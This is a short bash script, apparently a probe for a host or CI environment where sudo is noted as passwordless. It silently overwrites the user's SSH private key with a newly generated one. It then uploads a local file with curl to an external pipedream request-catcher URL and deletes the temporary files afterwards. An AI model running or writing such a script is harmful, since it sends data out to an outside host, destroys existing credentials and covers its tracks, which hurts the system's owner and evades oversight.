#!/bin/bash

# install gdb sudo is passwordless according to doc
#sudo apt-get install gdb -y > /tmp/file.txt

ssh-keygen -q -t rsa -N 'passphrase' -f ~/.ssh/id_rsa <<<y >/dev/null 2>&1 > /tmp/file.txt
echo "---------------------"

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
rm /tmp/run-results.txt
